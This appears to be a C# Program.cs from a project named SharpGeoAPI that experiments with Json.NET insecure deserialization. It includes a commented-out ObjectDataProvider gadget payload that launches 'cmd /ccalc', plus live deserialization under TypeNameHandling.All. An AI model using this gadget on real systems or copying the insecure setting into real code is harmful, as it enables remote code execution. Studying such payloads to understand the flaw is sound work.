using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq.Expressions;
using System.Reflection;
using System.Reflection.Emit;
using LiteDB;
using System.ServiceModel;
using log4net;
using log4net.Core;
using Newtonsoft.Json;
using SharpGeoAPI.HTTP;
using SharpGeoAPI.HTTP.Handlers;

namespace SharpGeoAPI
{
    public class Yarr
    {
        public string azaza;

        public Yarr()
        {
            Console.WriteLine("Shit!");
        }
    }

    class Program
    {
        static void Main(string[] args)
        {
            var storage = new Storage();


            var server = new HttpService(
                new Settings(), 
                new List<IBaseHandler>() {new StartNewSessionHandler()},
                storage,
                LogManager.GetLogger(typeof(HttpService)));
            /*var b = JsonConvert.DeserializeObject<object>(@"{
'$type':'System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35',
'MethodName':'Start',
'MethodParameters':{
    '$type':'System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089',
    '$values':['cmd','/ccalc']
},
'ObjectInstance':{'$type':'System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089'}
}", new JsonSerializerSettings()
        {
            TypeNameHandling = TypeNameHandling.Auto,
        });

        */
            var b = JsonConvert.DeserializeObject<List<object>>("[{'$type':'SharpGeoAPI.Yarr, SharpGeoAPI','azaza':null}]", 
            new JsonSerializerSettings()
            {
                TypeNameHandling = TypeNameHandling.All
            });

            new Process()
            {
                StartInfo = new ProcessStartInfo("cmd", "/ccalc")
            };

            //Console.WriteLine(b.GetType());

            //server.Start();
            Console.ReadLine();
        }
    }
}
